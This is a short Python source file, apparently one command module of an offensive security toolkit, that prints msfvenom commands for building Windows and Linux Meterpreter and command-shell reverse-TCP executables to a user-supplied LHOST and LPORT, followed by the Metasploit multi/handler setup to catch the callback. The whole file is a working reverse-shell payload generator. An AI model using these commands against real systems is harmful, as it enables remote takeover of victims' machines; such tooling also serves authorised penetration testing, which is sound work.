"""Metasploit payload generator"""

from Commands import Command

class MsfCommand(Command):
    name = "msf"
    description = "Metasploit payload generator"
    usage = "msf [type] [lhost] [lport]"
    
    def execute(self, args):
        if len(args) < 3:
            print("Usage: msf <type> <lhost> <lport>")
            print("Types: meterpreter, shell, stageless")
            return
        
        type_ = args[0]
        lhost = args[1]
        lport = args[2]
        
        print(f"\n[*] Metasploit Payload Generator")
        
        if type_ == "meterpreter":
            print(f"\n[+] Windows Meterpreter Reverse TCP:")
            print(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe")
            
            print(f"\n[+] Linux Meterpreter Reverse TCP:")
            print(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell")
        
        elif type_ == "shell":
            print(f"\n[+] Windows Command Shell:")
            print(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o cmd.exe")
        
        elif type_ == "stageless":
            print(f"\n[+] Stageless Meterpreter:")
            print(f"msfvenom -p windows/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe")
        
        print(f"\n[*] Handler:")
        print(f"use exploit/multi/handler")
        print(f"set payload windows/meterpreter/reverse_tcp")
        print(f"set LHOST {lhost}")
        print(f"set LPORT {lport}")
        print(f"run")
